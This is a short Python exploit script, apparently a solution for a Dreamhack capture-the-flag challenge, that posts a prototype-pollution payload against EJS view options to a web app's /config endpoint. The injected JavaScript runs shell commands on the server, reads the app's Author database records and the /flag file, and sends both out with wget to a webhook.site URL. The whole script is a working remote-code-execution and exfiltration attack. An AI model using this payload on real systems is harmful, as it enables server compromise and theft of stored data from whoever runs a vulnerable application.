#!/usr/bin/env python3
import requests
from datetime import datetime

print(f"[*] Started at {datetime(2024, 11, 22, 15, 13, 26)}")
print(f"[*] User: zwxxb")

payload = {
    "config_name": [
        "__proto__[view options][client]",
        "__proto__[view options][escapeFunction]"
    ],
    "value": [
        "1",
        """console.log;Author=process.mainModule.require('/app/models/Author').find().then(r => {
            b=Buffer.from(JSON.stringify(r)).toString('base64url');
            bbb=Buffer.from(process.mainModule.require('fs').readFileSync('/flag')).toString('base64url');
            process.mainModule.require('child_process').execSync('wget https://webhook.site/0abe626d-d91f-4a72-8b42-24b16ac1dd57?b='+b+'');
            process.mainModule.require('child_process').execSync('wget https://webhook.site/0abe626d-d91f-4a72-8b42-24b16ac1dd57?b='+bbb+'');
        });"""
    ]
}

s = requests.Session()
r = s.post("http://host3.dreamhack.games:12180/config", json=payload)
print("[+] Config sent:", r.status_code)
r = s.get("http://host3.dreamhack.games:12180/")
print(r.text)